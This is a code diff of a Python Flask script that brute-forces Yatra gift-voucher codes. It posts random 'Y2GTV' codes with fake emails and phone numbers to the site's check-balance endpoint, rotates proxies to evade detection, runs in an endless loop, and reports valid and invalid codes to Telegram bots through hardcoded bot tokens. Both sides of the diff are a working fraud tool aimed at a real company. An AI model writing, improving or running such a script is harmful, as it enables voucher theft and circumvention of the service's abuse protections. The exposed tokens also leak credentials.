@@ -1,122 +1,120 @@
-from flask import Flask, jsonify
 import random
+import string
 import requests
+from flask import Flask, jsonify
 import json
-import os
-import aiohttp
-import asyncio
+import threading
+import time
 
 app = Flask(__name__)
 
-# Load proxies from the file
-PROXY_FILE = "proxies.txt"
+# Helper function to generate random email
+def generate_random_email():
+    email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return f"{email_prefix}@gmail.com"
 
+# Helper function to generate random phone number
+def generate_random_phone():
+    phone = "9" + ''.join(random.choices(string.digits, k=9))  # Phone number starting with '9'
+    return phone
+
+# Helper function to generate random voucher code
+def generate_random_voucher_code():
+    return "Y2GTV" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+
+# Function to send message to Telegram bot
+def send_telegram_message(url, message):
+    telegram_url = f"{url}&text={message}"
+    requests.get(telegram_url)
+
+# Function to load proxies from the proxies.txt file
 def load_proxies():
-    """Load proxies from the file and prepend http:// if missing."""
-    if not os.path.exists(PROXY_FILE):
-        print("Proxy file not found.")
-        return []
-    with open(PROXY_FILE, "r") as f:
-        return [f"http://{line.strip()}" for line in f if line.strip()]  # Add http:// prefix
+    with open("proxies.txt", "r") as file:
+        proxies = file.readlines()
+    # Assuming the proxies.txt file has one proxy per line, in the format 'proxy:port'
+    return [proxy.strip() for proxy in proxies]
 
-PROXIES_LIST = load_proxies()
-
-def get_random_proxy():
-    """Select a random proxy from the list."""
-    if PROXIES_LIST:
-        proxy_url = random.choice(PROXIES_LIST)
-        return {"http": proxy_url, "https": proxy_url}
-    return None
-
-def generate_code():
-    """Generate a random code in the exact format Y2GTV?m?m?m?m?m?m?m?m?m?m."""
-    base = "Y2GTV"
-    suffix = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
-    return base + suffix
-
-def generate_email():
-    """Generate a random email address."""
-    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
-    username = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
-    return f"{username}@{random.choice(domains)}"
-
-def generate_phone():
-    """Generate a random 10-digit Indian phone number."""
-    return f"9{random.randint(100000000, 999999999)}"
-
-async def send_telegram_message(url):
-    """Send a message to a Telegram chat via the bot using the provided URL."""
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url) as response:
-                if response.status == 200:
-                    print("Message sent successfully to Telegram.")
-                else:
-                    print(f"Failed to send message to Telegram. Status code: {response.status}")
-    except Exception as e:
-        print(f"Error sending message to Telegram: {e}")
-
-async def make_post_request(code, email, phone):
-    """Make an asynchronous POST request to the Yatra API with the generated code."""
+# API request function
+def send_api_request(proxy):
+    # Define the URL and payload
     url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"
 
-    # Custom headers
-    headers = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "content-type": "application/json",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
-    }
-
-    # Payload
     payload = {
         "superPnr": "1611240003969",
-        "emailId": email,
+        "emailId": generate_random_email(),
         "amount": 13191,
         "lob": "AIR",
         "isd": "91",
-        "mobile": phone,
+        "mobile": generate_random_phone(),
         "source": "YT",
         "context": "REVIEW",
-        "vouchers": [{"code": code, "type": "PROMO", "pin": ""}]
+        "vouchers": [{"code": generate_random_voucher_code(), "type": "PROMO", "pin": ""}]
     }
 
-    proxy = get_random_proxy()
-    print(f"Using proxy: {proxy}")  # Debugging: See which proxy is used
+    headers = {
+        'scheme': 'https',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-length': '226',
+        'content-type': 'application/json',
+        'origin': 'https://secure.yatra.com',
+        'referer': 'https://secure.yatra.com/PaySwift/payment',
+        'sec-ch-ua': '"-Not.A/Brand";v="8", "Chromium";v="102"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest'
+    }
 
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, headers=headers, json=payload, proxy=proxy, timeout=10) as response:
-                response.raise_for_status()  # Raise HTTPError for bad responses
-                return await response.json()
-    except Exception as e:
-        print(f"Error during request: {e}")
-        return None
+    # Append 'http://' to the proxy if it's not already there
+    proxy = f"http://{proxy}"
 
+    # Define proxy
+    proxies = {
+        'http': proxy
+    }
+
+    # Send API request with proxy
+    response = requests.post(url, headers=headers, data=json.dumps(payload), proxies=proxies)
+
+    # Process the response
+    response_data = response.json()
+
+    if response_data.get('resCode') == 1:  # Failed response
+        failed_message = f"CODE : {payload['vouchers'][0]['code']}\n\nAPI Response:\n{json.dumps(response_data, indent=4)}"
+        send_telegram_message("https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395", failed_message)
+    elif response_data.get('resCode') == 0:  # Success response
+        success_message = f"CODE : {payload['vouchers'][0]['code']}\n\nAPI Response:\n{json.dumps(response_data, indent=4)}"
+        send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-680337101", success_message)
+
+# Function to run the request in an infinite loop
+def run_infinite_loop():
+    proxies = load_proxies()  # Load proxies from the file
+    request_count = 0
+    while True:
+        try:
+            proxy = random.choice(proxies)  # Pick a random proxy from the list
+            send_api_request(proxy)
+            request_count += 1
+            time.sleep(5)  # Wait for 5 seconds before sending the next request
+        except Exception as e:
+            print(f"Error in sending request: {e}")
+            time.sleep(5)  # Wait for a while before retrying
+
+# Flask route
 @app.route('/', methods=['GET'])
-async def run_task():
-    """Endpoint to trigger voucher validation."""
-    code = generate_code()
-    email = generate_email()
-    phone = generate_phone()
+def check_voucher():
+    return jsonify({"status": f"Requests sent: {request_count}"})
 
-    print(f"Generated code: {code}")
-    print(f"Generated email: {email}")
-    print(f"Generated phone: {phone}")
+if __name__ == '__main__':
+    # Start the infinite loop in a background thread
+    loop_thread = threading.Thread(target=run_infinite_loop)
+    loop_thread.daemon = True  # Daemonize the thread so it will exit when the main program exits
+    loop_thread.start()
 
-    response = await make_post_request(code, email, phone)
-
-    if response:
-        # Success: Send success message to Telegram
-        success_url = f"https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246&text=Success%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20Response:%20{json.dumps(response)}"
-        await send_telegram_message(success_url)
-        print(f"API Response: {json.dumps(response, indent=2)}")
-        return jsonify(response)
-    else:
-        # Failure: Send invalid code message to Telegram
-        error_url = f"https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395&text=Invalid%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20No%20valid%20response"
-        await send_telegram_message(error_url)
-        return jsonify({"error": "Request failed or no valid response received."})
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no port is specified
-    app.run(host="0.0.0.0", port=port, debug=True)
+    # Start the Flask app
+    app.run(debug=True)
